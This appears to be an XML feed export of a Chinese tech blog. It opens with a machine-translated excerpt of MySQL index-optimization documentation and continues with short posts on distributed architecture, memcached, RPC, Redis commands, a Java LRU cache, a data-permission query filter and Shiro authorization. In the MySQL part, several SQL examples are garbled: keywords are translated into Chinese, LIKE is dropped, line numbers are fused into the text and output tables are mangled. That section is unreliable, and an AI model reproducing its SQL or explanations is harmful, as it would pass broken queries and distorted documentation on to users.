myisam_stats_method系统变量有全局和会话值。设置全局值会影响相应存储引擎中表的统计信息收集。设置会话值仅影响当前客户端连接的统计信息收集。这意味着您可以强制使用给定方法重新生成表的统计信息，而不会通过设置会话值来影响其他客户端 myisam_stats_method。要重新生成MyISAM表格统计信息，可以使用以下任何一种方法：执行myisamchk --stats_method = - method_name 分析更改表使其统计信息过期（例如，插入一行然后删除它），然后设置 myisam_stats_method并发布一个ANALYZE TABLE 语句关于使用innodb_stats_method和的 一些注意事项 myisam_stats_method：如刚才所描述的，您可以强制显示表格统计信息。但是，MySQL也可能会自动收集统计信息。例如，如果在为表执行语句的过程中，其中一些语句会修改表，MySQL可能会收集统计信息。（例如，对于批量插入或删除，或者某些ALTER TABLE语句，可能会发生 这种情况。）如果发生这种情况，统计信息将使用任何值 innodb_stats_method或 myisam_stats_method在那个时候。因此，如果您使用一种方法收集统计信息，但是稍后自动收集表的统计信息时将系统变量设置为另一种方法，则将使用其他方法。无法确定哪种方法用于为给定的表生成统计信息。这些变量仅适用于表格InnoDB和 MyISAM表格。其他存储引擎只有一种收集表格统计信息的方法。通常它更接近该nulls_equal方法。 8.3.8 B树和散列索引的比较1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283了解B树和散列数据结构可以帮助预测不同的查询在使用索引中的这些数据结构的不同存储引擎上的性能，特别是用于MEMORY允许您选择B树或散列索引的存储引擎。B树索引特征哈希指数特征B树索引特征A B树索引可以在使用表达式中使用的对列的比较 =， &gt;， &gt;=， &lt;， &lt;=，或BETWEEN运营商。LIKE 如果参数为LIKE不是以通配符开头的常量字符串，则索引也可用于比较 。例如，以下SELECT语句使用索引：选择*从tbl_name哪里key_col &apos;帕特里克％&apos;;SELECT * FROM tbl_nameWHERE key_colLIKE &apos;％专利％_ck&apos;;在第一条语句中，只考虑了行。在第二条语句中，只考虑了行。 &apos;Patrick&apos; &lt;= key_col &lt; &apos;Patricl&apos;&apos;Pat&apos; &lt;= key_col &lt; &apos;Pau&apos;以下SELECT语句不使用索引：选择*从tbl_name哪里key_col&apos;％Patrick％&apos;;SELECT * FROM tbl_nameWHERE key_colLIKE other_col;在第一个语句中，该LIKE 值以通配符开头。在第二个声明中，该LIKE值不是一个常数。如果您使用并且 长度超过三个字符，则MySQL使用Turbo Boyer-Moore算法来初始化字符串的模式，然后使用此模式更快地执行搜索。 ... LIKE &apos;%string%&apos;string使用col_name IS NULL索引 搜索col_name索引。不跨越子句中所有AND级别的 任何索引 WHERE都不用于优化查询。换句话说，为了能够使用索引，必须在每个AND组中使用索引的前缀 。以下WHERE条款使用索引：... WHERE index_part1= 1 AND index_part2= 2 AND other_column= 3 / * index= 1 OR index= 2 * /... WHERE index= 1或A = 10 AND index= 2 / *优化如“ index_part1=&apos;hello&apos;”* /... WHERE index_part1=&apos;你好&apos;AND index_part3= 5 / *可以使用索引index1但不是index2或index3* /... WHERE index1= 1 AND index2= 2 OR index1= 3 AND index3= 3;这些WHERE条款 不使用索引： / * index_part1未使用* /... WHERE index_part2= 1 AND index_part3= 2 / *索引不用于WHERE子句的两个部分* /... WHERE index= 1或A = 10 / *没有索引跨越所有行* /... WHERE index_part1= 1 OR index_part2= 10有时MySQL不使用索引，即使有索引。出现这种情况的一种情况是，优化程序估计使用索引需要MySQL访问表中非常大部分的行。（在这种情况下，表扫描可能会快得多，因为它需要更少的搜索。）但是，如果这样的查询LIMIT仅用于检索某些行，则MySQL无论如何都会使用索引，因为它可以更快地找到结果中返回的行数很少。哈希指数特征哈希索引与刚刚讨论的哈希索引有些不同：它们只用于使用等于比较 =或&lt;=&gt; 运营商（但非常快）。它们不用于比较运算符，比如 &lt;找到一系列值。依赖这种单值查找的系统被称为“ 键值存储 ” ; 为这些应用程序使用MySQL，尽可能使用散列索引。优化器不能使用散列索引来加速 ORDER BY操作。（这种类型的索引不能用于按顺序搜索下一个条目。）MySQL不能确定两个值之间大约有多少行（范围优化器使用它来决定使用哪个索引）。如果您将某个表MyISAM或 InnoDB表更改为散列索引 MEMORY表，这可能会影响某些查询。只有整个键才能用来搜索一行。（使用B树索引，可以使用密钥的任何最左边的前缀来查找行。） 8.3.9使用索引扩展123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132InnoDB通过附加主键列来自动扩展每个二级索引。考虑这个表格定义：CREATE TABLE t1（ i1 INT NOT NULL DEFAULT 0， i2 INT NOT NULL DEFAULT 0， d DATE DEFAULT NULL， PRIMARY KEY（i1，i2）， INDEX k_d（d））ENGINE = InnoDB;该表定义列上的主键(i1, i2)。它还k_d在列上定义了二级索引 (d)，但在内部InnoDB扩展此索引并将其视为列(d, i1, i2)。优化程序在确定如何以及是否使用该索引时会考虑扩展二级索引的主键列。这可以导致更高效的查询执行计划和更好的性能。优化器可以使用扩展次要索引 ref，range和 index_merge索引访问，为松散索引扫描，对于加入和排序的优化，以及用于 MIN()/ MAX() 优化。以下示例显示了执行计划如何受到优化程序是否使用扩展辅助索引的影响。假设t1这些行被填充：INSERT INTO t1 VALUES（1,1，&apos;1998-01-01&apos;），（1,2，&apos;1999-01-01&apos;），（1，3，&apos;2000-01-01&apos;），（1，4，&apos;2001-01-01&apos;），（1，5，&apos;2002-01-01&apos;），（2,1，&apos;1998-01-01&apos;），（2，2，&apos;1999-01-01&apos;），（2,3，&apos;2000-01-01&apos;），（2,4，&apos;2001-01-01&apos;），（2，5，&apos;2002-01-01&apos;），（3,1，&apos;1998-01-01&apos;），（3,2，&apos;1999-01-01&apos;），（3,3，&apos;2000-01-01&apos;），（3,4，&apos;2001-01-01&apos;），（3，5，&apos;2002-01-01&apos;），（4,1，&apos;1998-01-01&apos;），（4，2，&apos;1999-01-01&apos;），（4，3，&apos;2000-01-01&apos;），（4，4，&apos;2001-01-01&apos;），（4，5，&apos;2002-01-01&apos;），（5,1，&apos;1998-01-01&apos;），（5,2，&apos;1999-01-01&apos;），（5，3，&apos;2000-01-01&apos;），（5，4，&apos;2001-01-01&apos;），（5，5，&apos;2002-01-01&apos;）;现在考虑这个查询：EXPLAIN SELECT COUNT（*）FROM t1 WHERE i1 = 3 AND d =&apos;2000-01-01&apos;在这种情况下，优化器不能使用主键，因为它包含列(i1, i2)并且查询没有引用i2。取而代之的是，优化器可以使用二级索引k_d上 (d)，并且执行计划依赖于扩展索引是否被使用。当优化器不考虑索引扩展时，它将索引k_d视为唯一(d)。 EXPLAIN为查询产生这个结果：MySQL的&gt; EXPLAIN SELECT COUNT(*) FROM t1 WHERE i1 = 3 AND d = &apos;2000-01-01&apos;\G*************************** 1. row ******************** ******* ID：1 select_type：SIMPLE 表：t1 键入：refpossible_keys：PRIMARY，k_d 键：k_d key_len：4 ref：const 行数：5 额外：使用where; 使用索引当优化需要索引扩展到帐户，它把k_d作为(d, i1, i2)。在这种情况下，它可以使用最左边的索引前缀(d, i1)来产生更好的执行计划：MySQL的&gt; EXPLAIN SELECT COUNT(*) FROM t1 WHERE i1 = 3 AND d = &apos;2000-01-01&apos;\G*************************** 1. row ******************** ******* ID：1 select_type：SIMPLE 表：t1 键入：refpossible_keys：PRIMARY，k_d 键：k_d key_len：8 ref：const，const 行：1 额外：使用索引在这两种情况下，都key表示优化器将使用二级索引，k_d但EXPLAIN输出显示了使用扩展索引的这些改进：key_len从4个字节到8个字节去，表明键查找中使用的列d 和i1，而不仅仅是d。该ref从价值变动 const到const,const ，因为键查找使用两个关键部分，没有之一。的rows计数降低从5到1，表明InnoDB应该需要检查更少的行，以产生结果。该Extra值从变化 Using where; Using index到 Using index。这意味着可以仅使用索引读取行，而无需查阅数据行中的列。使用扩展索引的优化器行为差异也可以通过以下方式看出SHOW STATUS：FLUSH TABLE t1;FLUSH STATUS;SELECT COUNT（*）FROM t1 WHERE i1 = 3 AND d =&apos;2000-01-01&apos;;SHOW STATUS LIKE&apos;handler_read％&apos;前面的语句包含FLUSH TABLES并FLUSH STATUS 刷新表缓存并清除状态计数器。没有索引扩展，SHOW STATUS产生这样的结果：+ ----------------------- + ------- +| 变量名| 值|+ ----------------------- + ------- +| Handler_read_first | 0 || Handler_read_key | 1 || Handler_read_last | 0 || Handler_read_next | 5 || Handler_read_prev | 0 || Handler_read_rnd | 0 || Handler_read_rnd_next | 0 |+ ----------------------- + ------- +通过索引扩展，SHOW STATUS生成此结果。该 Handler_read_next值从5减少到1，表示更有效地使用该指数：+ ----------------------- + ------- +| 变量名| 值|+ ----------------------- + ------- +| Handler_read_first | 0 || Handler_read_key | 1 || Handler_read_last | 0 || Handler_read_next | 1 || Handler_read_prev | 0 || Handler_read_rnd | 0 || Handler_read_rnd_next | 0 |+ ----------------------- + ------- +在确定如何使用表的二级索引时use_index_extensions，optimizer_switch系统变量 的标志 允许控制优化程序是否考虑主键列 InnoDB。默认情况下， use_index_extensions已启用。要检查禁用索引扩展是否会提高性能，请使用以下语句：SET optimizer_switch =&apos;use_index_extensions = off&apos;;优化器使用索引扩展受索引（16）中关键部分数量和最大关键字长度（3072字节）的通常限制。 8.3.10优化器使用生成的列索引123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475MySQL支持生成列上的索引。例如：CREATE TABLE t1（f1 INT，gc INT AS（f1 + 1）STORED，INDEX（gc））;生成的列gc被定义为表达式f1 + 1。该列也被编入索引，并且优化程序可以在执行计划构建期间考虑该索引。在以下查询中，该 WHERE子句引用gc 并且优化器考虑该列上的索引是否产生更高效的计划：SELECT * FROM t1 WHERE gc&gt; 9;优化器可以在生成的列上使用索引来生成执行计划，即使在没有按名称对这些列进行查询时直接引用也是如此。会发生此如果 WHERE，ORDER BY或 GROUP BY条款是指一些索引生成列的定义相匹配的表达式。以下查询不直接引用，gc 但使用的表达式符合以下定义 gc：SELECT * FROM t1 WHERE f1 + 1&gt; 9;优化器识别出表达f1 + 1的定义相匹配gc，并且gc被索引，因此它认为执行计划在施工期间的索引。你可以看到这个使用 EXPLAIN：MySQL的&gt; EXPLAIN SELECT * FROM t1 WHERE f1 + 1 &gt; 9\G*************************** 1. row ******************** ******* ID：1 select_type：SIMPLE 表：t1 分区：NULL 键入：范围possible_keys：gc key：gc key_len：5 ref：NULL 行：1 过滤：100.00 额外：使用索引条件实际上，优化程序已将表达式替换为与表达式f1 + 1匹配的生成列的名称。在以下EXPLAIN 显示的扩展信息中可用的重写查询中也很明显SHOW WARNINGS：MySQL的&gt; SHOW WARNINGS\G*************************** 1. row ******************** ******* 级别：注意 代码：1003Message：/ * select＃1 * / select`test`.`t1`.`f1` as``f1`，`test`.`t1`.`gc` as```````````````gc`以下限制和条件适用于优化器使用生成的列索引：对于查询表达式来匹配生成的列定义，表达式必须是相同的，并且它必须具有相同的结果类型。例如，如果生成的列表达式是f1 + 1，如果查询使用1 + f1，或者f1 + 1 （整数表达式）与字符串进行比较，则优化器不会识别匹配 。优化适用于这些操作符： =， &lt;， &lt;=， &gt;， &gt;=， BETWEEN，和 IN()。对于BETWEEN和 以外的 IN()操作符，可以用匹配的生成列替换操作数。对于 BETWEEN和 IN()，只有第一个参数可以被匹配的生成列替换，其他参数必须具有相同的结果类型。 BETWEEN并且 IN()尚未支持涉及JSON值的比较。生成的列必须被定义为一个表达式，该表达式至少包含一个函数调用或上述项目中提到的某个操作符。表达式不能包含对另一列的简单引用。例如，gc INT AS (f1) STORED仅由一个列引用组成，因此gc不考虑索引 。为了将字符串与索引生成列进行比较，这些字段从返回带引号字符串的JSON函数计算值，JSON_UNQUOTE()需要在列定义中从函数值中删除多余的引号。（对于字符串与函数结果的直接比较，JSON比较器处理引用移除，但这不会发生在索引查找中）。例如，不是像这样写一个列定义：doc_name TEXT AS（JSON_EXTRACT（jdoc，&apos;$ .name&apos;））存储这样写：doc_name TEXT AS（JSON_UNQUOTE（JSON_EXTRACT（jdoc，&apos;$ .name&apos;）））STORED对于后者的定义，优化器可以检测这两个比较的匹配情况：... WHERE JSON_EXTRACT（jdoc，&apos;$ .name&apos;）=&apos; some_string&apos;...... WHERE JSON_UNQUOTE（JSON_EXTRACT（jdoc，&apos;$ .name&apos;））=&apos; some_string&apos;...如果没有JSON_UNQUOTE()在列定义中，优化器只会对这些比较中的第一个进行匹配。如果优化器未能选择所需的索引，则可以使用索引提示来强制优化器做出不同的选择。]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>SQL优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分布式架构]]></title>
    <url>%2F2018%2F03%2F24%2Fservice-design%2Fdesign-1%2F</url>
    <content type="text"><![CDATA[最近几年关于架构的信息高并发架构、异地多活架构【出自淘宝】容器化【知名docker、阿里Pouch】微服务架构【spring cloud】高可用架构弹性架构【DB中间件 需要极致的弹性】 相关的技术DevOps、应用监控、自动化运维、SOA服务治理、去IOE等等 分布式能解决的两大问题：1、系统容量更大 面对的业务量与日俱增、垂直水平拆分系统业务2、系统可用性更强 整个系统不会因为一个单点故障而导致整个系统不可用 分布式冗余节点、以消除单点故障 分布式优势：1、模块化、系统模块重用度更高2、模块化、服务开发、发布更快3、系统扩展性更高4、团队协作更有效率 分布式存在的问题：1、设计复杂2、部署单个简单、部署多个复杂3、系统吞吐量增大、系统反应变慢4、运维复杂5、学习难度加大6、测试复杂7、技术复杂、带来维护复杂8、系统中的服务调度、监控等等复杂 分布式前景：可以说分布式是无法避免的、随着业务量的增大不可能单点跑应用、不同的应用场景会产出不用的服务架构、学习成本是逐渐加大的、等分布式更加成熟形成了体系、应该会产出更加系统的学习方案和应用方案、]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>服务架构</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[系统设计一些基本原则]]></title>
    <url>%2F2018%2F03%2F24%2Fservice-design%2Fdesign-0%2F</url>
    <content type="text"><![CDATA[参照梁飞–dubbo创始人—一些设计上的基本常识 不看不知道 一看吓一跳原来一个复杂的服务系统这么多门道 以前只晓得 API SPI分离。。。 1234567891011121314151617181920API 与 SPI 分离服务域/实体域/会话域分离在重要的过程上设置拦截接口重要的状态的变更发送事件并留出监听接口扩展接口职责尽可能单一，具有可组合性微核插件式，平等对待第三方不要控制外部对象的生命周期可配置一定可编程，并保持友好的 CoC 约定区分命令与查询，明确前置条件与后置条件增量式扩展，而不要扩充原始核心概念]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>服务架构</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[memcached]]></title>
    <url>%2F2018%2F03%2F24%2Fcache%2Fmemcached%2F</url>
    <content type="text"><![CDATA[memcached 简介 Memcached的 Memcached.svg 开发者（S） Danga Interactive 初始发行 2003年5月22日 稳定版本 1.5.8 / 2018年5月25日; 39天前[1] 知识库 https://github.com/memcached/memcached 在维基数据上编辑此内容 写入 C 操作系统 跨平台 类型 分布式内存缓存系统 执照 修订BSD许可证[2] 网站 memcached .org Memcached（发音：mem-cash-dee，mem-cashed）是一种通用的分布式内存缓存系统。它通常用于通过在RAM中缓存数据和对象来加速动态数据库驱动的网站，以减少必须读取外部数据源（如数据库或API）的次数。Memcached是免费的开源软件，根据修订的BSD许可证授权。[2] Memcached在类Unix操作系统（至少是Linux和OS X）和Microsoft Windows上运行。这取决于libevent库。 Memcached的API提供了一个分布在多台机器上的非常大的哈希表。当表已满时，后续插入会导致较旧的数据以最近最少使用（LRU）顺序被清除。[3] [4]使用Memcached的应用程序通常将请求和添加分层到RAM中，然后再回到较慢的后备存储（例如数据库）上。 Memcached没有内部机制来跟踪可能发生的未命中，但是，某些第三方实用程序提供此功能。 数据结构 key-value【string】 特点 client-server 结构 服务端、维护key-value 互不通信 客户端、自行管理数据在各个服务间的分配 性能 get获取时间戳、懒校验 内存不足 LRU算法、主动淘汰 多核存储、集群性能要高于redis 内存利用率要高于redis 集群 服务器互相独立 客户端hash存储数据]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>缓存</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[医院总流程图]]></title>
    <url>%2F2018%2F03%2F24%2Fservice-design%2Fdesign-2%2F</url>
    <content type="text"><![CDATA[]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>服务架构</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RPC]]></title>
    <url>%2F2018%2F03%2F24%2Fagreement%2Frpc%2F</url>
    <content type="text"><![CDATA[RPC（Remote Procedure Call）—远程过程调用 工作原理 1.调用客户端句柄；执行传送参数 2.调用本地系统内核发送网络消息 3.消息传送到远程主机 4.服务器句柄得到消息并取得参数 5.执行远程过程 6.执行的过程将结果返回服务器句柄 7.服务器句柄返回结果，调用远程系统内核 8.消息传回本地主机 9.客户句柄由内核接收消息 10.客户接收句柄返回的数据 协议结构123456789101112131415161718192021222324252627远程过程调用（RPC）信息协议由两个不同结构组成：调用信息和答复信息。信息流程如下所示：RPC：远程过程调用流程RPC 调用信息：每条远程过程调用信息包括以下无符号整数字段，以独立识别远程过程：程序号（Program number）程序版本号（Program version number）过程号（Procedure number）RPC 调用信息主体形式如下：struct call_body &#123;unsigned int rpcvers;unsigned int prog;unsigned int vers;unsigned int proc;opaque_auth cred;opaque_auth verf;1 parameter2 parameter . . . &#125;；RPC 答复信息：RPC 协议的答复信息的改变取决于网络服务器对调用信息是接收还是拒绝。答复信息请求包括区别以下情形的各种信息：RPC 成功执行调用信息。.RPC 的远程实现不是协议第二版，返回 RPC 支持的最低和最高版本号。在远程系统中，远程程序不可用。远程程序不支持被请求的版本号。返回远程程序所支持的最低和最高版本号。请求的过程号不存在。通常是呼叫方协议或程序差错。RPC答复信息形式如下：enum reply_stat stat&#123;MSG_ACCEPTED = 0,MSG_DENIED = 1 &#125;;]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[千万级别系统搭建]]></title>
    <url>%2F2018%2F03%2F24%2Fservice-design%2Fdesign-3%2F</url>
    <content type="text"><![CDATA[123456789101112131415161718192021结合springcloud1.服务分级SOA2.流量带宽(1M17用户.按一千万并发计算需要600M带宽.当然1M17用户前提是网页数据60kb)3.数据库分层(垂直.横向是最基本的.还有灵活添加\卸载数据库).千万级别用户.数据量至少亿级别.数据库每百万分一个.至少100+数据库(若要是应对高并发.高峰流量冲击可以使用AliSQL)4.那么准备zuul网关服务器就得有(按每个tomcat并发1500计算)要考虑的点.网卡属性.tomcat支持并发.nginx支持并发(用来放在zuul前面可以支持一台服务器部署多个zuul).内存容量.cpu计算能力.内存用量和cpu计算能力 限定了数据库和tomcat计算能力.所以也不是单看一个点就能估算并发能力5.还有访问深度.访问跟踪各个服务跟踪状况.还是得学习啊 限流12345限制瞬时并发限制总并发数限制时间窗口内平均速率相关算法：滑动窗口协议 漏桶--- 令牌桶----应对突发流量 计数器]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>服务架构</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[http协议]]></title>
    <url>%2F2018%2F03%2F24%2Fagreement%2Fhttp%2F</url>
    <content type="text"><![CDATA[http协议 HTTP 定义了 消息发送流程与信息格式 发送端1231、请求行2、请求头3、请求体 接受端1231、响应行2、响应头3、响应体]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[风控系统]]></title>
    <url>%2F2018%2F03%2F24%2Fservice-design%2Fdesign-5%2F</url>
    <content type="text"><![CDATA[目的监控交易、渠道产品用户、从而识别交易风险、尽早发现欺诈 功能需求实时监控、 针对各类支付业务交易风险事件进行监测与控制 同步反馈、 接受处理支付业务平台支付信息请求、并由风控系统将处理结果实时返回业务系统 联动控制、 对风控系统识别出的风险信息、进行系统自动化、通过人工预置策略实现 持续迭代、 交易风险特征识别方式可以通过系统自动整理、人工设定参数、 或者与外部资源共享等进行持续动态更新 非功能性需求灵活性、 风控规则经常调整、由此能与不同业务系统集成 性能、 100ms异步操作、以及高吞吐量 准确性、 冻结账户以及相关交易单元 平衡点、 准确性低与大面积投诉请求、公司形象 盲点：不可以盲目追求数据一致性 风控实时引擎0--------100 不可评估-----风险值越高、风险越大 公司风控数据主要来自风控引擎 规则引擎优缺点优点：规则变动比较频繁、其他部分相对稳定 通过引入规则引擎可以结构系统与规则、提高复杂逻辑的可维护性、提高规则可理解性 风控准实时引擎某些情况下、需要通过对最近一段时间内数据分析 例：对最近半个月数据分析、 分工准实时引擎、 从消息服务器获取交易数据 对交易数据进行异步分析、 分析结果通过分控服务存入风控数据库、 供实时风控引擎评估风险 风控准实施引擎从发现异常到风控数据生效时间在100ms以内、可有效防止交易风险增大 风控系统初始建设中风控准实时引擎、 往往是通过消息监听器消息、把中间数据存储redis、对数据进行多维度分析 总结1、每月进行一次数据风控数据处理 2、实时分析引擎 3、数据落地服务 4、规则引擎：本地数据、第三方消费数据 5、奖励、处罚]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>服务架构</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[redis]]></title>
    <url>%2F2018%2F03%2F24%2Fcache%2Fredis%2F</url>
    <content type="text"><![CDATA[1、使用ANSIC编写 （基于BSD协议）2、开源、内存中数据结构存储3、可以用作数据库、缓存、消息中间件 支持多种数据结构String、hash、list、set、sorted sets、bitmaps、geospatial字符串、散列、列表、集合、有序集合、bitmaps、地理空间 redis内置 复制(application) LUA脚本 LRU驱动事件、事物(transtrations) 和不同级别的硬盘持久化并通过redis哨兵(sentinel)和自动分区(cluster)提高可用性 Redis支持每隔一段时间将数据导出磁盘、支持主从复制、且第一次是快速非阻塞形式 由于组合式压缩、内存使用率要高于memcached其他：12345事物订阅分发lua脚本过期自动删除key自动故障转移 优势1234性能极高、读11W次/s 写8.1W次/s丰富的数据类型原子性操作丰富特性、支持publish、sub scribe 通知 key过期等等 redis命令：12345678910111213创建当前备份 save恢复数据：config get dit &quot;dir&quot; &quot;usr/local/redis/bin&quot;将dump移动到安装目录 并启动服务即可创建备份：Bg savebackground saving started 该命令后台执行恢复备份redis-cli --rdb /tmp/dump.rdb检查主从数据流：从模式 redis-cli --slave从配置修改: slave-read-only yes从数据库: slave of host:port清空: flushall远程连接: redis-cli -h host -p port -a password redis发布订阅123456789声明客户端 subscribe redischat推动消息 publish redischat &quot;this is a exp&quot;创建集合 sadd a redisset sadd a memcachedsmembers a创建列表结合listlpush a redislpush a mysqllrange a 0/0 安装12345678910111213yum install redis -ycat /etc/redis.conf默认配置可能要修改的数据logfile /var/log/redis/redis.logslave-serve-stale-data yesslave-read-only yes#requirepass redisPassword# The filename where to dump the DBdbfilename dump.rdb]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>缓存</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[缓存淘汰算法]]></title>
    <url>%2F2018%2F03%2F24%2Fcache%2Fcache-elimination-algorithm%2F</url>
    <content type="text"><![CDATA[常见算法:LRULRU-K2QMQ 缓存淘汰算法12345678910111213缓存分析三大要点： 命中率、复杂度、代价LRU 最近最少使用算法FIFO 先入先出算法MRU 最近最常使用算法FIFO 先进先出 LFU 最少使用算法 LFU（Least Frequently Used）最近最少使用算法。它是基于“如果一个数据在最近一段时间内使用次数很少，那么在将来一段时间内被使用的可能性也很小”的思路。LRU LRU全称是Least Recently Used，即最近最久未使用的意思注意LFU和LRU算法的不同之处，LRU的淘汰规则是基于访问时间，而LFU是基于访问次数的。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142/** * Created by huoyan403 on 2017/8/16. * * 这个类也被Tomcat所使用（ org.apache.tomcat.util.collections.LRUCache），但是在tomcat6.x版本中，已经被弃用，使用另外其他的缓存类来替代它。 */public class LRUCache &#123; private int cacheSize; private Hashtable nodes;//缓存容器 private int currentSize; private CacheNode first;//链表头 private CacheNode last;//链表尾 /** * 链表节点 * @author Administrator * */ class CacheNode &#123; CacheNode prev;//前一节点 CacheNode next;//后一节点 Object value;//值 Object key;//键 CacheNode() &#123; &#125; &#125; public LRUCache(int i) &#123; currentSize = 0; cacheSize = i; nodes = new Hashtable(i);//缓存容器 &#125; /** * 获取缓存中对象 * @param key * @return */ public Object get(Object key) &#123; CacheNode node = (CacheNode) nodes.get(key); if (node != null) &#123; moveToHead(node); return node.value; &#125; else &#123; return null; &#125; &#125; /** * 添加缓存 * @param key * @param value */ public void put(Object key, Object value) &#123; CacheNode node = (CacheNode) nodes.get(key); if (node == null) &#123; //缓存容器是否已经超过大小. if (currentSize &gt;= cacheSize) &#123; if (last != null)//将最少使用的删除 nodes.remove(last.key); removeLast(); &#125; else &#123; currentSize++; &#125; node = new CacheNode(); &#125; node.value = value; node.key = key; //将最新使用的节点放到链表头，表示最新使用的. moveToHead(node); nodes.put(key, node); &#125; /** * 将缓存删除 * @param key * @return */ public Object remove(Object key) &#123; CacheNode node = (CacheNode) nodes.get(key); if (node != null) &#123; if (node.prev != null) &#123; node.prev.next = node.next; &#125; if (node.next != null) &#123; node.next.prev = node.prev; &#125; if (last == node) last = node.prev; if (first == node) first = node.next; &#125; return node; &#125; public void clear() &#123; first = null; last = null; &#125; /** * 删除链表尾部节点 * 表示 删除最少使用的缓存对象 */ private void removeLast() &#123; //链表尾不为空,则将链表尾指向null. 删除连表尾（删除最少使用的缓存对象） if (last != null) &#123; if (last.prev != null) last.prev.next = null; else first = null; last = last.prev; &#125; &#125; /** * 移动到链表头，表示这个节点是最新使用过的 * @param node */ private void moveToHead(CacheNode node) &#123; if (node == first) return; if (node.prev != null) node.prev.next = node.next; if (node.next != null) node.next.prev = node.prev; if (last == node) last = node.prev; if (first != null) &#123; node.next = first; first.prev = node; &#125; first = node; node.prev = null; if (last == null) last = first; &#125;&#125;]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>缓存</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[权限系统_数据权限控制]]></title>
    <url>%2F2018%2F03%2F24%2Fservice-permission%2Fpermission-data%2F</url>
    <content type="text"><![CDATA[1、使用 query filter 先举例说明一下数据权限，假设一个工作任务应用有以下的需求： 普通员工可以查看自己的工作项部门经理可以查看自己管理部门的所有工作项对于普通员工和部门经理，他们访问应用的入口都是相同的，应用需要根据不同的角色返回不一样的数据结果，这就是数据权限控制。 数据权限是个比较复杂的问题，规则非常灵活，在Leap中并没有内置实现，但提供了一个基础机制，可以相对简单的实现数据权限。 1.1 查询过滤器（Query Filter） 查询过滤器是 ORM 模块中的功能，默认是关闭的，开启后所有的查询语句都会在 where 语句的最后自动加上类似 @filter(User) 的表达式。 假设执行查询语句：12345select * from user u where u.name = :name那么开启 Query Filter 后将会自动变为：select * from user u where ( u.name = :name )&#123;? and ( @filter(User) )&#125;关于查询过滤器的细节在这里不展开细说，下面具体说明如何使用查询过滤器实现数据权限。 1.2 基于 Query Filter 实现数据权限 1.3 开启 修改 src/main/resources/conf/config.xml ，增加以下配置属性：123&lt;properties prefix=&quot;orm&quot;&gt; &lt;property name=&quot;query_filter.enabled&quot; value=&quot;true&quot;/&gt;&lt;/properties&gt; 1.4 实现 123456789101112131415161718192021222324编写类 SecurityQueryFilter.java ：package hello.beans;import leap.lang.params.Params;import leap.orm.sql.Sql;import leap.orm.sql.SqlContext;import leap.orm.sql.SqlTag;import leap.orm.sql.SqlTagProcessor;public class SecurityQueryFilter implements SqlTagProcessor &#123; @Override public String processTag(SqlContext context, Sql sql, SqlTag tag, Params params) &#123; String entityName = tag.getContent(); if(entityName.equals(&quot;User&quot;)) &#123; return &quot;t.id = #&#123;env.user.id&#125;&quot;; &#125; return null; &#125;&#125;返回的表达式语法请看数据访问章节，其中别名 t. 是固定写法，在执行中会被替换为真正的别名。配置 bean 生效：&lt;bean name=&quot;filter&quot; type=&quot;leap.orm.sql.SqlTagProcessor&quot; class=&quot;hello.beans.SecurityQueryFilter&quot;/&gt; 2.使用sqlMAP进行sql拼接 其原理也是sql拼接 不写了 参考地址：http://leapframework.org/doc/security/op_perm.html]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>权限认证</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[权限系统_shiro_授权流程]]></title>
    <url>%2F2018%2F03%2F24%2Fservice-permission%2Fshiro-1%2F</url>
    <content type="text"><![CDATA[Shiro Authorization （ 授权） 官方授权图片 步骤： 授权成功后 关于权限使用有三种方式 1、编写代码 2、JDK标签 3、JSPGSP标签库 这里要解释下 RBAC 以前的RBAC是 Role-Based-Access-Control 基于角色的访问控制 权限表 是 用户表-角色表-操作url表 【Menu】 控制方式是 用户拥有某权限——–权限拥有某url【controller】 才可以访问 麻烦点就是 后台判断用户是否拥有权限时，判断用户角色 那么就是把角色和资源绑定到一起、这样后期开发会发生这么一种情况、就是有个默认角色后期我可能要删除、使用新角色来控制这些资源、那么 到时候就要更新代码重新发布 而最新的RBAC是 Resource-Based-Access-Control 基于资源的访问控制 权限表是 用户表【user】-角色表-功能许可表【Permission】 控制方式就是 用户拥有某一角色——–角色拥有这一资源许可——-资源许可和代码【controller】绑定在一起 后期要更改角色权限 就把这个角色删掉就可以了 并不会影响代码 不需要重构代码 shiro中同时使用两种方式进行 权限判断 用户可以自行选择 相关使用方法 参加xmind]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>权限认证</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OAuth OAuth2]]></title>
